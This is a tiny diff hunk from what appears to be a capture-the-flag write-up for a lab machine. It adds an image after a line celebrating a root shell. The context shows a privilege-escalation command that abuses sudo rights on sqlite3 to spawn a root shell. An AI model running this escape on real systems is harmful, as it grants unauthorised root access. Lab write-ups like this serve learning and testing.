@@ -212,4 +212,4 @@ frank@devguru:/dev/shm/devguru-website$ sudo sqlite3 /dev/null '.shell /bin/sh'
 
 ### And we get our root shell :D
 
-
+![megu](./images/megu.gif)
